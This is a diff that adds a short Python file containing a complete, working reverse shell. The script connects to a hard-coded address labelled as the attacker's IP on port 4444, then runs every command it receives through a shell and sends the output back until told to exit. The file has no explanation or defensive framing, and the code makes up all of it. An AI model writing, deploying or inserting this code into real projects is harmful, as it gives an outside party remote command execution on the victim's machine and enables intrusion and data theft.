@@ -1,0 +1,24 @@
+import socket
+import subprocess
+
+def reverse_shell():
+    host = '192.168.10.128'  # Attacker's IP address
+    port = 4444           # Attacker's port
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+
+    while True:
+        command = s.recv(1024).decode()
+        if command.lower() == 'exit':
+            break
+
+        output = subprocess.run(command, shell=True, capture_output=True, text=True)
+        result = output.stdout + output.stderr
+
+        s.send(result.encode())
+
+    s.close()
+
+if __name__ == "__main__":
+    reverse_shell()
